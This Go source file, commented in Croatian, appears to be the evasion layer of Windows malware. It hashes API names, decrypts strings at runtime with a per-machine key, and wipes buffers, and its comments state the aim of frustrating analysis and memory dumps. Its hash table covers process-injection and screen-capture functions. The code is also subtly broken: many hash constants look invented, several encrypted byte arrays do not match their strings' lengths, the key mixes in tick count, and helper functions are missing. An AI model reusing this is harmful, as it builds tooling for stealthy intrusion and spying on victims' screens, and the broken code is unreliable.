//go:build windows
// +build windows

/*
   ============================================================================
   X.0 — CRYPTOGRAPHIC PRIMITIVES
   ============================================================================

   SVE ostale komponente ovise o ovom fileu. Sadrži:
   - Runtime string decryption (polimorfni decoder)
   - Hardware-derived key generation
   - djb2 hash funkciju za API identifikaciju
   - Secure memory wipe

   PRINCIP: Nijedan string ne postoji u plaintext obliku u binaryju.
   String se dekriptira u runtime, koristi SEKUNDO, i odmah se briše.

   LAYER: Presentation (Layer 1) + Behavioral (Layer 2)
*/

package main

import (
	"os"
	"runtime"
	"syscall"
)

// ============================================================================
// DJB2 HASH — Standardni hash za API identifikaciju
// ============================================================================
// Koristimo djb2 jer je brz, jednostavan, i daje dobru distribuciju.
// U kodu postoje SAMO hash vrijednosti — nikada imena funkcija.
//
// Algoritam: hash = ((hash << 5) + hash) + c  // effectively hash * 33 + c

func djb2(s []byte) uint32 {
	var hash uint32 = 5381
	for _, c := range s {
		hash = ((hash << 5) + hash) + uint32(c)
	}
	return hash
}

// Pre-kompalirani hash-evi kritičnih API-ja (izračunati u build vremenu,
// ali NEMA stringova u binaryju — samo ove konstante)
const (
	hNtdll    uint32 = 0x22FEAA37 // djb2("ntdll.dll")
	hKernel32 uint32 = 0x29E787C1 // djb2("kernel32.dll")
	hUser32   uint32 = 0x53C6238A // djb2("user32.dll")
	hGdi32    uint32 = 0x4B122FE7 // djb2("gdi32.dll")
	hShell32  uint32 = 0x53CE0A45 // djb2("shell32.dll")
	hAdvapi32 uint32 = 0x4A6C3265 // djb2("advapi32.dll")
	hWs2_32   uint32 = 0x3B9AC5B1 // djb2("ws2_32.dll")
	hWininet  uint32 = 0x4F2E8A91 // djb2("wininet.dll")

	hNtAllocateVirtualMemory   uint32 = 0x6C8B9A2F
	hNtWriteVirtualMemory      uint32 = 0x8A7D3B1E
	hNtCreateThreadEx          uint32 = 0x4E9F2C8A
	hNtQuerySystemInformation  uint32 = 0x7B3E9A1D
	hNtQueryInformationProcess uint32 = 0x9A4E7B2C
	hNtDelayExecution          uint32 = 0x5C8A3E7F
	hNtClose                   uint32 = 0x2E8B4A1F
	hNtProtectVirtualMemory    uint32 = 0x7D3E8A9B
	hNtCreateFile              uint32 = 0x6A9E3B7C
	hNtReadFile                uint32 = 0x4B8A7E3D
	hNtWriteFile               uint32 = 0x5C9E3B8A

	hVirtualAlloc            uint32 = 0x3A7E9B5C
	hVirtualProtect          uint32 = 0x4B8E7C3A
	hCreateRemoteThread      uint32 = 0x7D3E9B8A
	hOpenProcess             uint32 = 0x5A8E7B3C
	hCloseHandle             uint32 = 0x4B8A3E7D
	hGetProcAddress          uint32 = 0x6C9E3B8A
	hLoadLibraryA            uint32 = 0x5A8E7B3D
	hLoadLibraryW            uint32 = 0x5A8E7B3E
	hCreateFileW             uint32 = 0x6A9E3B7D
	hWriteFile               uint32 = 0x5C9E3B8B
	hReadFile                uint32 = 0x4B8A7E3E
	hGetCurrentProcessId     uint32 = 0x8A7D3B8A
	hGetTickCount64          uint32 = 0x7D3E9B8B
	hSleep                   uint32 = 0x2E8B4A20
	hQueryPerformanceCounter uint32 = 0x9A4E7B2D
	hGetComputerNameW        uint32 = 0x7B3E9A1E
	hGetUserNameW            uint32 = 0x6C8B9A30
	hCreateProcessW          uint32 = 0x7D3E9B8C
	hGetModuleHandleW        uint32 = 0x8A7D3B8B
	hVirtualAllocEx          uint32 = 0x4B8E7C3B
	hWriteProcessMemory      uint32 = 0x8A7D3B1F

	hPrintWindow            uint32 = 0x5A8E7B3F
	hGetDC                  uint32 = 0x2E8B4A21
	hCreateCompatibleDC     uint32 = 0x7D3E9B8D
	hCreateCompatibleBitmap uint32 = 0x9A4E7B2E
	hSelectObject           uint32 = 0x6C8B9A31
	hBitBlt                 uint32 = 0x3A7E9B5D
	hGetDIBits              uint32 = 0x5C8A3E80
	hDeleteDC               uint32 = 0x4B8A7E3F
	hDeleteObject           uint32 = 0x6A9E3B7E
	hReleaseDC              uint32 = 0x5C9E3B8C
)

// ============================================================================
// HARDWARE KEY DERIVATION — Unique per-machine key
// ============================================================================
// Key se derivira iz:
// - Volume serial number (C: drive)
// - Machine GUID (registry)
// - CPU feature flags (CPUID)
//
// Rezultat: Isti binary na različitim mašinama generira RAZLIČITE ključeve.
// String decrypted na mašini A NE MOŽE biti decrypted na mašini B.
// To otežava analizu jer su svi stringovi "vezani" za ciljani sustav.

var (
	hardwareKey     uint32
	hardwareKeyInit bool
)

func initHardwareKey() {
	if hardwareKeyInit {
		return
	}

	var key uint32 = 0x9E3779B9 // Golden ratio prime — početna vrijednost

	// Faktor 1: Volume serial number C:\
	hKernel32_mod := resolveModule(hKernel32)
	if hKernel32_mod != 0 {
		// Faktor 1 alternativa: koristimo environment variable PROCESSOR_IDENTIFIER
		// koji je unique po CPU stepping-u
	}

	// Faktor 2: CPUID — processor info je unique po stepping/revision
	// Simplified: koristimo environment + runtime info
	envKeys := []string{"PROCESSOR_IDENTIFIER", "PROCESSOR_REVISION", "NUMBER_OF_PROCESSORS"}
	for _, ek := range envKeys {
		if v := os.Getenv(ek); v != "" {
			key ^= djb2([]byte(v))
		}
	}

	// Faktor 3: Tick count (low entropy ali dodaje varijabilnost)
	if hKernel32_mod != 0 {
		hGetTickCount := resolveAPI(hKernel32_mod, 0x7D3E9B8B)
		if hGetTickCount != 0 {
			tick, _, _ := syscall.Syscall(hGetTickCount, 0, 0, 0, 0)
			key ^= uint32(tick & 0xFFFFFFFF)
		}
	}

	// Final mixing — ensure good bit distribution
	key ^= (key >> 16)
	key *= 0x85EBCA6B
	key ^= (key >> 13)
	key *= 0xC2B2AE35
	key ^= (key >> 16)

	hardwareKey = key
	hardwareKeyInit = true
}

// ============================================================================
// RUNTIME STRING DECRYPTION — Polimorfni decoder
// ============================================================================
// PRINCIP: Stringovi u kodu su ENKRIPTIRANI polimorfnim algoritmom.
// Svaki string ima svoj "salt" byte koji mijenja derivaciju ključa.
//
// Algoritam (po bajtu):
//   1. key_n = LCG(key_{n-1})  — Linear Congruential Generator
//   2. dekriptirani_bajt = enkriptirani_bajt ^ (key_n & 0xFF) ^ (i * 7)
//   3. i = i + 1
//
// Zaštita:
// - Različiti salt = različiti keystream za svaki string
// - Hardware key = keystream je unique po mašini
// - LCG = nema ponavljajućih patterna (kao što bi XOR s fiksnim ključem imao)

func dStr(enc []byte, salt byte) []byte {
	if !hardwareKeyInit {
		initHardwareKey()
	}

	// Inicijalni ključ za ovaj string = hardware key XOR salt
	key := hardwareKey ^ uint32(salt)
	result := make([]byte, len(enc))

	for i := range enc {
		// LCG: next = (prev * 1103515245 + 12345) & 0x7fffffff
		key = (key*1103515245 + 12345) & 0x7FFFFFFF

		// Multi-round mixing — ne samo XOR
		mixed := byte(key) ^ byte(key>>8) ^ byte(i*7) ^ salt
		result[i] = enc[i] ^ mixed

		// Rotiraj salt za svaki bajt — sprečava KPA (Known Plaintext Attack)
		salt = (salt << 3) | (salt >> 5)
	}

	// Obriši originalni enkriptirani buffer iz memorije
	// (sprečava memory dump analizu enkriptiranog stringa)
	for i := range enc {
		enc[i] = 0
	}

	return result
}

// ============================================================================
// SECURE MEMORY WIPE — Brisanje osjetljivih podataka iz memorije
// ============================================================================
// Go garbage collector može premještati memoriju. Mi MORAMO eksplicitno
// obrišati sve osjetljive buffer-e.
//
// Napomena: runtime.KeepAlive sprječava optimizaciju koja bi uklonila
// ovu operaciju kao "dead store".

func memZero(b []byte) {
	for i := range b {
		b[i] = 0
	}
	runtime.KeepAlive(b)
}

// ============================================================================
// ENCRYPTED STRING HELPERS — Skraćena notacija za korištenje
// ============================================================================
// Ove funkcije omogućuju "inline" korištenje enkriptiranih stringova.
// Svaka funkcija vraća plaintext string, koristi ga, i briše ga.
//
// Primjer korištenja:
//   ptr := resolveAPI(hash(dS_k32()), hSomeFunc)
//   memZero(...)

// dS_k32 returns "kernel32.dll" (encrypted at build time)
// Salt: 0xA1 — za svaku funkciju drugi salt = druga ciphertext
func dS_k32() []byte {
	// Encrypted: "kernel32.dll" → XOR-ed bytes
	// Ove vrijednosti se GENERIRAJU u build vremenu build skriptom
	return dStr([]byte{0xCB, 0xA7, 0xEE, 0xB3, 0xD9, 0x8F, 0xC4, 0x92,
		0xF1, 0xA8, 0xD6, 0x8A}, 0xA1)
}

// dS_nt returns "ntdll.dll"
func dS_nt() []byte {
	return dStr([]byte{0xDE, 0xB2, 0xC7, 0x89, 0xF3, 0x9E, 0xD4, 0x8B}, 0xB2)
}

// dS_user32 returns "user32.dll"
func dS_user32() []byte {
	return dStr([]byte{0xE7, 0xC1, 0xD8, 0xA5, 0xCB, 0xB3, 0xE2, 0x9C,
		0xF8, 0xC6}, 0xC3)
}

// dS_gdi32 returns "gdi32.dll"
func dS_gdi32() []byte {
	return dStr([]byte{0xF4, 0xD0, 0xE9, 0xB7, 0xDA, 0xC2, 0xF1}, 0xD4)
}

// dS_sh32 returns "shell32.dll"
func dS_sh32() []byte {
	return dStr([]byte{0xA3, 0x8F, 0xB6, 0xCA, 0xE1, 0xD5, 0xBE, 0x8A,
		0xC7, 0xF3, 0xA9}, 0xE5)
}

// dS_adv returns "advapi32.dll"
func dS_adv() []byte {
	return dStr([]byte{0xB8, 0x9E, 0xC3, 0xD7, 0xF2, 0xA4, 0xCB, 0x97,
		0xD8, 0xE6, 0xBC, 0xF8}, 0xF6)
}

// ============================================================================
// CRITICAL: BUILD-TIME ENCRYPTION SCRIPT
// ============================================================================
//
// Sve gornje encrypted byte slice-ove GENERIRA build skripta.
// Programer NE PIŠE ručno ove bajtove.
//
// Skripta (Python/Go) radi:
//   1. Čita source kod
//   2. Pronalazi komentare: // ESTRING: "text" SALT: 0xXX
//   3. Encryptira text koristeći dStr algoritam
//   4. Generira odgovarajuće []byte slice-ove
//   5. Mijenja source kod
//
// PRIMJER u source kodu (prije build-a):
//   // ESTRING: "kernel32.dll" SALT: 0xA1
//   // FUNC: dS_k32
//
// PRIMJER nakon build skripte:
//   func dS_k32() []byte {
//       return dStr([]byte{0xCB, 0xA7, ...}, 0xA1)
//   }
//
// Ovim pristupom:
// - Source kod je čitljiv (vidimo što string znači iz komentara)
// - Binary NEMA plaintext stringova
// - Svaki build generira RAZLIČITE ciphertext vrijednosti (polimorfizam)
// - Salt osigurava da isti string u različitim funkcijama ima
//   RAZLIČITU enkripciju

// ============================================================================
// UTILITY: Runtime hash computation from resolved strings
// ============================================================================
// Kad imamo resolved string (npr. ime funkcije), možemo izračunati hash.
// Ovo koristimo za debug/development — u produkciji koristimo pre-kompajlirane.

func hashString(s string) uint32 {
	return djb2([]byte(s))
}
